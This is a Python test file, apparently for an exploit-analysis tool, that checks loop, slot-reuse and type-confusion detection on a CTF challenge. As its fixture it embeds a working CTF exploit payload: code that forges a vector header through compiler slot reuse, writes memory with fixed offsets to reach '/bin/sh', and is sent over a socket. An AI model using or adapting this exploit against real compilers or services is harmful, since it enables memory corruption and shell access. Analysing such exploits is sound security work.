import json
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
AUTOCORRECT = ROOT / "autocorrect"
PROJECT = ROOT / "pwncraft"
for path in (AUTOCORRECT, PROJECT):
    if str(path) not in sys.path:
        sys.path.insert(0, str(path))

from challenge_intake import load_splits, split_for_case
from pwncraft.features.audit.embedded_compiler import EmbeddedCompilerPolicy
from pwncraft.features.audit.semantic_facts import analyze_exp_semantics

CASE_ID = "memory_write-sctf-2026-slang-a31e8aa0"
TRUTH = ROOT / "autocorrect" / "cases" / CASE_ID / "expected_truth_cycle17.json"

OFFICIAL_EXP_SHAPE = r'''PAYLOAD = r''' + "'''" + r'''function one() : -> int {
  return 1;
}

function forge() : -> str {
  return "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x7f";
}

function pwn(int round, vec forged_vec) : -> void {
  if (round == 0) {
    return;
  };
  say("resolve puts");
  scribble(forged_vec, 526339, -205200);
  say("/bin/sh");
  return;
}

function main() : int round, int keep_marker, vec vec_slot, str forged_header -> int {
  vec_slot := vec_new(0);
  round := 0;
  keep_vec(vec_slot);

  do {
    pwn(round, vec_slot);
    forged_header := forge();
    keep_marker := one() + 1234;
    round := round + 1;
  } while (round < 2);

  keep_str(forged_header);
  keep_int(keep_marker);
  return 0;
}
''' + "'''" + r'''

def main():
    source = PAYLOAD + "END_OF_SOURCE\n"
    sock.sendall(source.encode())
'''


def _truth() -> dict:
    return json.loads(TRUTH.read_text(encoding="utf-8"))


def _policy() -> EmbeddedCompilerPolicy:
    raw = _truth()["reviewed_compiler_policy"]
    return EmbeddedCompilerPolicy(
        name=raw["name"],
        skip_loop_void_call_arguments_in_liveness=raw[
            "skip_loop_void_call_arguments_in_liveness"
        ],
        codegen_preserves_call_arguments=raw["codegen_preserves_call_arguments"],
        slot_allocator=raw["slot_allocator"],
        provenance=raw["provenance"],
    )


def _main_execution(result: dict) -> dict:
    execution = result["embedded_execution_semantics"][0]
    return next(item for item in execution["functions"] if item["function"] == "main")


def test_truth_revision_four_is_locked_to_official_sctf_materials() -> None:
    assert split_for_case(CASE_ID, load_splits()) == "train"
    truth = _truth()
    assert truth["truth_lock"]["truth_revision"] == 4
    assert truth["truth_lock"]["supersedes"] == \
        "truth-sctf2026-slang-compiler-liveness-slot-reuse-v3"
    assert truth["materials"]["official_writeup_git_blob_sha1"] == \
        "f6d4a55258e8cd64fe31565eb3ce8fa7de7b1ab9"


def test_official_loop_state_proves_a_second_iteration() -> None:
    result = analyze_exp_semantics(
        OFFICIAL_EXP_SHAPE, embedded_compiler_policy=_policy()
    )
    assert result["status"] == "ok"
    main = _main_execution(result)
    loop = main["loops"][0]
    assert loop["condition"] == "round < 2"
    assert loop["integer_state_before_first_iteration"]["round"] == 0
    assert loop["integer_state_after_first_iteration"]["round"] == 1
    assert loop["condition_after_first_iteration"] is True
    assert loop["proves_second_iteration"] is True


def test_official_reused_slot_value_flows_into_second_iteration_vec_consumer() -> None:
    result = analyze_exp_semantics(
        OFFICIAL_EXP_SHAPE, embedded_compiler_policy=_policy()
    )
    main = _main_execution(result)
    flow = next(
        item for item in main["cross_iteration_value_flows"]
        if item["producer_variable"] == "forged_header"
        and item["consumer_variable"] == "vec_slot"
    )
    assert flow["slot"] == 0
    assert flow["producer_type"] == "str"
    assert flow["consumer_type"] == "vec"
    assert flow["consumer_callee"] == "pwn"
    assert flow["resident_value_survives_loop_backedge"] is True


def test_cycle17_promotes_only_type_confusion_relation_not_write_primitive() -> None:
    result = analyze_exp_semantics(
        OFFICIAL_EXP_SHAPE, embedded_compiler_policy=_policy()
    )
    main = _main_execution(result)
    confusion = next(
        item for item in main["runtime_type_confusions"]
        if item["resident_variable"] == "forged_header"
        and item["consumed_through_variable"] == "vec_slot"
    )
    assert confusion["iteration"] == 2
    assert confusion["resident_type"] == "str"
    assert confusion["consumed_as_type"] == "vec"
    assert confusion["runtime_observed"] is False
    assert result["primitives"] == []

    truth = _truth()
    assert "automatic exact forge return-byte decoding into target vec fields is not implemented in this cycle" in truth["unknown"]
